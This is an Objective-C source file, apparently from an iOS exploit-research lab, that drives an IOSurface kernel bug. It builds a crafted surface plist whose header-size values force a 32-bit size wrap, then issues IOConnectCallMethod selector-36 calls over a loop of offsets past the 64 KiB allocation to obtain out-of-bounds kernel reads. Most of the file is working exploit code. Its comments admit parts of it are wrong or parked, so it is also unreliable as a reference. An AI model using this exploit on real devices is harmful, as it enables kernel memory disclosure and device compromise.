//
//  P176F1SeedWindow.m — the F1-seed confused-window calib (p176). 2026-11-18.
//  Seed geometry: murk-sus / F1OOB-PoC (MIT) — credit murk-sus. Proven on 24B115/T8110;
//  this tap re-proves T8150/24B156 and drives the LightSword window over the F1 sid.
//  Laws: one tap per force-quit; PANIC-POSSIBLE; hits are receipt-class (NOT hasKread).
//

#import "P176F1SeedWindow.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <IOKit/IOKitLib.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <string.h>
#import <stdlib.h>

typedef mach_port_t io_obj_t;
typedef CFMutableDictionaryRef (*p176_match_t)(const void *);
typedef io_obj_t (*p176_getsvc_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*p176_open_t)(io_obj_t, mach_port_t, uint32_t, mach_port_t *);
typedef kern_return_t (*p176_method10_t)(mach_port_t, uint32_t,
                                         const void *, uint32_t,     /* struct in   */
                                         const uint64_t *, uint32_t, /* scalars in  */
                                         void *, uint32_t *,         /* struct out  */
                                         uint64_t *, uint32_t *);    /* scalars out */
typedef kern_return_t (*p176_method6_t)(mach_port_t, uint32_t,
                                        const void *, uint32_t,
                                        void *, uint32_t *);

#define P176_BUILD @"p176-f1-seed-v1"

static int g_fd = -1;
static void Lf(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
static void Lf(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    if (![s hasSuffix:@"\n"]) s = [s stringByAppendingString:@"\n"];
    if (g_fd >= 0) { const char *c = s.UTF8String; if (c) { write(g_fd, c, strlen(c)); fcntl(g_fd, F_FULLFSYNC); } }
}

/* murk-sus F1 XML, verbatim geometry (F1OOB-PoC main.m f1_xml) — in-band limit 0x1000 */
static NSString * const kF1XML =
    @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    @"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
    @"<plist version=\"1.0\"><dict>"
    @"<key>IOSurfaceWidth</key><integer>64</integer>"
    @"<key>IOSurfaceHeight</key><integer>64</integer>"
    @"<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    @"<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    @"<key>IOSurfaceAllocSize</key><integer>65536</integer>"
    @"<key>IOSurfaceSliceCount</key><integer>4</integer>"
    @"<key>IOSurfacePlaneInfo</key><array><dict>"
    @"<key>IOSurfacePlaneWidth</key><integer>64</integer>"
    @"<key>IOSurfacePlaneHeight</key><integer>64</integer>"
    @"<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
    @"<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
    @"<key>IOSurfacePlaneSize</key><integer>65536</integer>"
    @"<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
    @"<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
    @"<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
    @"<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
    @"<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
    @"<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
    @"<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
    @"</dict></array>"
    @"</dict></plist>\n";

static NSString * const kControlXML =
    @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
    @"<plist version=\"1.0\"><dict>"
    @"<key>IOSurfaceWidth</key><integer>64</integer>"
    @"<key>IOSurfaceHeight</key><integer>64</integer>"
    @"<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
    @"<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
    @"</dict></plist>\n";

@implementation P176F1SeedWindow

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    g_fd = open([docs stringByAppendingPathComponent:@"p176_f1seed_log.txt"].fileSystemRepresentation,
                O_CREAT | O_WRONLY | O_TRUNC, 0644);
    NSString *head = [NSString stringWithFormat:
        @"=== p176 session %@ BUILD %@ ===\n%@\n"
        "F1-seed confused-window calib on 24B156/27.2.1 (doors: p018 v3).\n"
        "Seed credit: murk-sus (F1OOB-PoC, MIT). Window conversion = LightSword lane.\n"
        "PANIC-POSSIBLE (kernel window confusion). ONE TAP. Hits = receipt-class only.\n",
        LabLocalMilitaryNow(), P176_BUILD, [LabDeviceProfile identBlock]];
    Lf(@"%@", head); [o appendString:head];

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *d = h ? h : RTLD_DEFAULT;
    p176_match_t matching = (p176_match_t)dlsym(d, "IOServiceMatching");
    p176_getsvc_t getsvc  = (p176_getsvc_t)dlsym(d, "IOServiceGetMatchingService");
    p176_open_t open_     = (p176_open_t)dlsym(d, "IOServiceOpen");
    p176_method10_t m10   = (p176_method10_t)dlsym(d, "IOConnectCallMethod");
    if (!matching || !getsvc || !open_ || !m10) {
        Lf(@"[-] dlsym incomplete — stop");
        if (g_fd >= 0) close(g_fd);
        return o;
    }

    /* 1. open IOSurfaceRoot (p018 door 1) */
    CFMutableDictionaryRef m = matching("IOSurfaceRoot");
    io_obj_t svc = getsvc(0, m);
/* the matching dict is CONSUMED by IOServiceGetMatchingService — no CFRelease (the 20:09 0x11d33-era receipt: CFRelease+84 trap) */
    mach_port_t conn = 0;
    kern_return_t kr = open_(svc, mach_task_self(), 0, &conn);
    Lf(@"[open] IOSurfaceRoot kr=0x%x conn=%d", kr, (int)(uintptr_t)conn);
    if (kr != KERN_SUCCESS || !conn) { Lf(@"[-] door closed this boot"); if (g_fd >= 0) close(g_fd); return o; }

    /* 2. control create (sanity — the p018 receipt shape) */
    {
        const char *xc = kControlXML.UTF8String;
        size_t xl = strlen(xc) + 1;
        uint64_t sc[1] = {0};
        uint8_t info[0xc68]; memset(info, 0, sizeof(info));
        uint32_t isz = sizeof(info);
        kr = m10(conn, 0, xc, (uint32_t)xl, sc, 1, info, &isz, NULL, NULL);
        uint32_t sid = isz >= 0x1c ? ((uint32_t *)info)[6] : 0;   /* info+0x18 */
        Lf(@"[CTRL] sel0 kr=0x%x out=%u sid=0x%x (control = must succeed)", kr, isz, sid);
    }

    /* 3. F1 create via murk's in-band XML */
    uint32_t f1sid = 0;
    {
        if (kF1XML.length + 1 > 0x1000) {
            Lf(@"[-] XML exceeds the 0x1000 in-band limit");
            if (g_fd >= 0) { close(g_fd); g_fd = -1; }
            return o;   /* no cross-init jump (CI error 65 class) */
        }
        const char *xc = kF1XML.UTF8String;
        size_t xl = strlen(xc) + 1;
        uint64_t sc[1] = {0};
        uint8_t info[0xc68]; memset(info, 0, sizeof(info));
        uint32_t isz = sizeof(info);
        kr = m10(conn, 0, xc, (uint32_t)xl, sc, 1, info, &isz, NULL, NULL);
        f1sid = isz >= 0x1c ? ((uint32_t *)info)[6] : 0;
        Lf(@"[F1] sel0 kr=0x%x out=%u sid=0x%x (the 32-bit-wrap shape: (0x4000+0x40000000)*4 → 0x10000)",
           kr, isz, f1sid);
        if (kr != KERN_SUCCESS) {
            Lf(@"[-] F1 create rejected — quote the T8150/24B156 parse delta vs murk's T8110 receipt; ladder ends honestly");
            if (g_fd >= 0) { close(g_fd); g_fd = -1; }
            return o;   /* the rejected-create receipt is recorded above */
        }
        /* 4. field readback (murk's verification shape) */
        if (isz >= 0x90) {
            uint32_t sliceCount, hdr, data;
            memcpy(&sliceCount, info + 0x74, 4);
            memcpy(&hdr,   info + 0x88 + 0x84, 4);
            memcpy(&data,  info + 0x88 + 0x80, 4);
            Lf(@"[F1] readback sliceCount=0x%x headerPerSlice=0x%x dataPerSlice=0x%x (murk's law)",
               sliceCount, hdr, data);
        }
    }

    /* 5. WINDOW LOOP PARKED (sync review 2026-11-18): p176 as written calls
       sel36 on the IOSurfaceRoot connection — but sel36 is the IOGPU
       device-UC {rid,0,len} law; the window conversion needs the GPU-side
       UC (murk/A-coldforge cf_device_conn) and the murk A/B control first
       (p174). Arm: Documents/p176_arm.txt. */
    NSString *armDoc = [docs stringByAppendingPathComponent:@"p176_arm.txt"];
    if (![[NSFileManager defaultManager] fileExistsAtPath:armDoc]) {
        Lf(@"[-] WINDOW LOOP PARKED — Documents/p176_arm.txt absent (review 2026-11-18: wrong UC + wrong I/O shape as written).");
        Lf(@"=== p176 done (parked) ===");
        if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
        return o;
    }
    Lf(@"[*] WINDOW LOOP ARMED (p176_arm.txt present)");
    /* 5. the confused-window read over the F1 sid: 16 windows at increasing offsets
          PAST the 64 KiB alloc. A non-marker qword at >0x10000 = kernel-side OOB read
          receipt (the 4 GiB logical/64 KiB backing law; cluster_write_contig unfixed on 24C5049d). */
    {
        uint64_t hits = 0, tries = 0;
        for (uint32_t widx = 1; widx <= 16 && f1sid; widx++) {
            uint64_t off = (uint64_t)widx * 0x4000;   /* 64 KiB windows past alloc */
            if (off < 0x10000) continue;
            uint8_t in[12];
            memset(in, 0, sizeof(in));
            memcpy(in, &f1sid, 4);
            memcpy(in + 4, &off, 8);
            uint64_t so[2] = {0, 0};
            uint32_t soN = 2;
            uint8_t so8[8]; memset(so8, 0, 8);
            uint32_t so8N = 8;
            /* p018 shape: sel36 {id, off, len} — scalars in, 1 u32 out */
            kr = m10(conn, 36, NULL, 0, NULL, 0, so8, &so8N, so, &soN);
            tries++;
            uint64_t q0 = so8N >= 8 ? *(uint64_t *)so8 : 0;
            int krange = (q0 >> 48) >= 0xffff;
            if (kr == KERN_SUCCESS || krange) {
                hits++;
                Lf(@"[F1 window %u] off=0x%llx sel36 kr=0x%x out0=0x%016llx kernel_range=%d "
                   @"— RECEIPT: read past the 64 KiB backing succeeded (confused-window law)",
                   widx, (unsigned long long)off, kr, (unsigned long long)q0, krange);
            } else {
                Lf(@"[F1 window %u] off=0x%llx sel36 kr=0x%x (clean)", widx, (unsigned long long)off, kr);
            }
        }
        Lf(@"[window verdict] tries=%llu hits=%llu — %s",
           (unsigned long long)tries, (unsigned long long)hits,
           hits ? "OOB READ RECEIPTS — kernel-side content past the F1 backing (27.2.1)"
                : "clean — the F1 window held; deterministic seed failed this boot");
    }

    /* 6. sel36 on the F1 id, p018's receipt shape {id,0,0x1000} */
    if (f1sid) {
        uint8_t in[12]; memset(in, 0, sizeof(in));
        memcpy(in, &f1sid, 4);
        uint32_t scOutN = 2; uint64_t scOut[2] = {0,0};
        kr = m10(conn, 36, in, 12, NULL, 0, NULL, NULL, scOut, &scOutN);
        Lf(@"[F1 sel36] kr=0x%x outN=%u out0=0x%016llx (p018's 0x11d33 law, F1-crossed)",
           kr, scOutN, scOutN >= 1 ? scOut[0] : 0ull);
    }

done:
    Lf(@"=== p176 done (one tap per force-quit; fresh boot law) ===");
    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
    return o;
}

@end
